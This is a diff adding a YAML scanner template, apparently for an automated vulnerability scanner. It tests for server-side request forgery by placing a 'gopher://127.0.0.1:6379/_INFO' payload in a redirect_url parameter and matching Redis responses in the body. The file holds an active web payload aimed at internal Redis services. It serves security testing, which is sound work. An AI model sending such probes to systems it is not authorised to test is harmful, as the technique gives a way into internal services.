@@ -1,0 +1,21 @@
+id: patt-ssrf-scheme-gopher-01-redirect_url
+name: 'PATT ssrf patt-ssrf-scheme-gopher-01 via redirect_url'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - schemegopher
+description: 'PATT scheme gopher:// ke Redis (Gopherus). [patt:patt-ssrf-scheme-gopher-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      redirect_url:
+        - 'gopher://127.0.0.1:6379/_INFO'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PONG'
+          - 'redis'
